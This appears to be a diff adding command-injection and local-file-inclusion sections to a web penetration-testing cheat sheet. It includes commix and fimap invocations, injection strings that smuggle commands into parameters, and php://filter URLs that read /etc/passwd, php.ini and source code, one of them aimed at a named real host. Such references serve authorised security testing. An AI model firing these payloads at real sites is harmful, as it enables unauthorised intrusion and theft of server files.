@@ -89,6 +89,37 @@ POST:
 
 {% endhighlight %}
 
+> **Command Injection**
+{% highlight bash %}
+#Commix Automated Tool
+commix --level=3 --url="http://website/?arg=INJECT_HERE&arg2=argument" 
+
+#Test Strings
+test`pwd`
+test$(pwd)
+test; pwd
+test | pwd
+{% endhighlight %}
+
+> **Local File Include**
+
+{% highlight bash %}
+#Automated Tool
+fimap -u 'http://website/?p=file.html'
+
+#Test for Local File Include
+http://website/?p=file%3a%2f%2f%2fetc%2fpasswd
+
+#Grab data
+http://website/?p=php://filter/convert.base64-encode/resource=/etc/php/7.0/apache2/php.ini
+http://utilities.snrt.io/?p=php://filter/convert.base64-encode/resource=index.php
+
+#Rebuild Base64 file (e.g.,executable)
+base64 -d extractedBase64File > executable2
+
+{% endhighlight %}
+
+
 > **Blind Command Injection**
 
 {% highlight bash %}
